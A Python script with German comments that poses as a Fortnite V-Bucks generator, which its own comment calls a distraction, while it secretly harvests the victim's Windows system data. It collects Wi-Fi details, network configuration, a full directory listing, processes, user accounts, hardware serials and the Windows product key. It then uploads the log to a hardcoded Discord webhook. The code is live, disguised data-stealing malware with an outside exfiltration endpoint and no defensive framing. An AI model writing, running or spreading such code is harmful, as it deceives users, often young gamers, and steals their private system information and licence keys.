import subprocess
import os
import requests

# Einstellungen für den Discord Webhook
webhook_url = "https://discord.com/api/webhooks/1260028879729332275/bhliony5asku0znPNm424ciasbyH9-qoj926nz3Z8yeHy7TPM5GvhNHGajpBW-HRnovA"
file_name = "log.txt"

# WLAN-Informationen sammeln und in log.txt speichern
with open(file_name, "w") as log_file:
    log_file.write("================== WLAN Information ==================\n")
    result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], capture_output=True, text=True)
    log_file.write(result.stdout)

# Ablenkung für vbucks-Generierung
vbucks_number = input("Enter vbucks number max-12000: ")
username = input("Enter username: ")

# Spam von Zahlen in verschiedenen Farben
with open(file_name, "a") as log_file:
    log_file.write("\n================== Vbucks Generation Attempt ==================\n")
    for i in range(1, 151):
        log_file.write(f"try to send {vbucks_number} gift to {username}-----bot invite--- fail\n")

# Weitere Informationen sammeln und in log.txt speichern
with open(file_name, "a") as log_file:
    log_file.write("\n================== System and Network Information ==================\n")

    log_file.write("\n================== System Information ==================\n")
    result = subprocess.run(['systeminfo'], capture_output=True, text=True)
    log_file.write(result.stdout)

    log_file.write("\n================== Network Configuration ==================\n")
    result = subprocess.run(['ipconfig', '/all'], capture_output=True, text=True)
    log_file.write(result.stdout)

    log_file.write("\n================== Ping Test ==================\n")
    result = subprocess.run(['ping', 'localhost', '-n', '5'], capture_output=True, text=True)
    log_file.write(result.stdout)

    log_file.write("\n================== Tracert ==================\n")
    result = subprocess.run(['tracert', 'localhost'], capture_output=True, text=True)
    log_file.write(result.stdout)

    log_file.write("\n================== Directory Listing ==================\n")
    result = subprocess.run(['dir', '/s'], capture_output=True, text=True, shell=True)
    log_file.write(result.stdout)

    log_file.write("\n================== Current Directory ==================\n")
    result = subprocess.run(['cd'], capture_output=True, text=True, shell=True)
    log_file.write(result.stdout)

    log_file.write("\n================== Running Processes ==================\n")
    result = subprocess.run(['tasklist', '/v'], capture_output=True, text=True)
    log_file.write(result.stdout)

    log_file.write("\n================== Hardware and System Information ==================\n")
    commands = [
        ['wmic', 'computersystem', 'get', 'name,manufacturer,model,systemtype,totalphysicalmemory'],
        ['wmic', 'bios', 'get', 'manufacturer,version,serialnumber'],
        ['wmic', 'cpu', 'get', 'caption,deviceid,manufacturer,maxclockspeed,name,numberofcores,numberoflogicalprocessors,status'],
        ['wmic', 'diskdrive', 'get', 'deviceid,model,size,status'],
        ['wmic', 'memorychip', 'get', 'banklabel,capacity,caption,speed'],
        ['wmic', 'os', 'get', 'caption,buildnumber,installdate,serialnumber,lastbootuptime']
    ]
    for cmd in commands:
        result = subprocess.run(cmd, capture_output=True, text=True)
        log_file.write(result.stdout)

    log_file.write("\n================== User Account Information ==================\n")
    result = subprocess.run(['net', 'user'], capture_output=True, text=True)
    log_file.write(result.stdout)

    log_file.write("\n================== Hostname ==================\n")
    result = subprocess.run(['hostname'], capture_output=True, text=True)
    log_file.write(result.stdout)

    log_file.write("\n================== DNS Lookup ==================\n")
    dns_target = input("Enter target address for DNS lookup: ")
    result = subprocess.run(['nslookup', dns_target], capture_output=True, text=True)
    log_file.write(result.stdout)

    log_file.write("\n================== ARP Table ==================\n")
    result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
    log_file.write(result.stdout)

    log_file.write("\n================== Current Username ==================\n")
    log_file.write(os.getlogin() + "\n")

    log_file.write("\n================== Computername ==================\n")
    log_file.write(os.environ['COMPUTERNAME'] + "\n")

    log_file.write("\n================== System File Checker ==================\n")
    result = subprocess.run(['sfc', '/scannow'], capture_output=True, text=True)
    log_file.write(result.stdout)

    log_file.write("\n================== Boot Configuration Data ==================\n")
    result = subprocess.run(['bcdedit', '/enum', 'all'], capture_output=True, text=True)
    log_file.write(result.stdout)

    log_file.write("\n================== Event Logs ==================\n")
    result = subprocess.run(['wevtutil', 'qe', 'System', '/c:5', '/rd:true'], capture_output=True, text=True)
    log_file.write(result.stdout)

    log_file.write("\n================== BIOS Serial Number ==================\n")
    result = subprocess.run(['wmic', 'bios', 'get', 'serialnumber'], capture_output=True, text=True)
    log_file.write(result.stdout)

    log_file.write("\n================== CPU Description ==================\n")
    result = subprocess.run(['wmic', 'cpu', 'get', 'caption'], capture_output=True, text=True)
    log_file.write(result.stdout)

    log_file.write("\n================== Installed RAM Capacity ==================\n")
    result = subprocess.run(['wmic', 'memorychip', 'get', 'capacity'], capture_output=True, text=True)
    log_file.write(result.stdout)

    log_file.write("\n================== Disk Drive Size ==================\n")
    result = subprocess.run(['wmic', 'diskdrive', 'get', 'size'], capture_output=True, text=True)
    log_file.write(result.stdout)

    log_file.write("\n================== IP Address Information ==================\n")
    result = subprocess.run(['wmic', 'nicconfig', 'get', 'IPAddress,Caption'], capture_output=True, text=True)
    log_file.write(result.stdout)

    log_file.write("\n================== Windows Product Key ==================\n")
    result = subprocess.run(['wmic', 'path', 'softwarelicensingservice', 'get', 'OA3xOriginalProductKey'], capture_output=True, text=True)
    log_file.write(result.stdout)

    log_file.write("\n================== Installed Drivers (Detailed) ==================\n")
    result = subprocess.run(['driverquery', '/FO', 'list', '/v'], capture_output=True, text=True)
    log_file.write(result.stdout)

    log_file.write("\n================== Power Plans ==================\n")
    result = subprocess.run(['powercfg', '/list'], capture_output=True, text=True)
    log_file.write(result.stdout)

    log_file.write("\n================== Drives Information ==================\n")
    result = subprocess.run(['fsutil', 'fsinfo', 'drives'], capture_output=True, text=True)
    log_file.write(result.stdout)

print("Logging information saved to log.txt")

# Senden der log.txt Datei an den Discord Webhook als Datei
with open(file_name, 'rb') as f:
    response = requests.post(webhook_url, files={'file': f})

if response.status_code == 200:
    print("Log file successfully sent to the webhook.")
else:
    print("Failed to send log file to the webhook.")
